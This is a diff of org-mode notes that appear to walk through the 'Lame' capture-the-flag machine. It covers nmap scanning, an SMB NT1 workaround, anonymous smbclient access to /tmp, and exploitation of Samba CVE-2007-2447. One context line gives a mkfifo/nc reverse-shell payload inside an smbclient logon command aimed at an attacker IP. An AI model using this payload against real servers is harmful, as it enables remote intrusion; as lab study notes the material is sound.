@@ -10,7 +10,7 @@ nmap -sC -sV -oA Lame.nmap <ip>
       + CVE-2007-2447 (msfconsole will give this result)
 
 * problems:
-  1. had to use smb version NT1 to connect server. 
+  + had to use smb version NT1 to connect to the server. 
   #+begin_src sh
 ## /etc/samba/smb.conf::[global], add the following line:
 client min protocol = NT1
@@ -22,6 +22,8 @@ client min protocol = NT1
    + enumerate the smb directory, find where anonymous login is possible:
    #+begin_src sh
 smbclient -L //ip -m NT1
+## gives a list of folders
+## among which, oops, /tmp allows anonymous login
    #+end_src
    
    + anonymous login to /tmp
@@ -37,4 +39,3 @@ logon "/=`nohup rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.2
      ## vuln at source/smbd/map_username.c
      ## internal of the vuln: https://0x00sec.org/t/cvexplained-cve-2007-2447/22748
    #+end_src
-
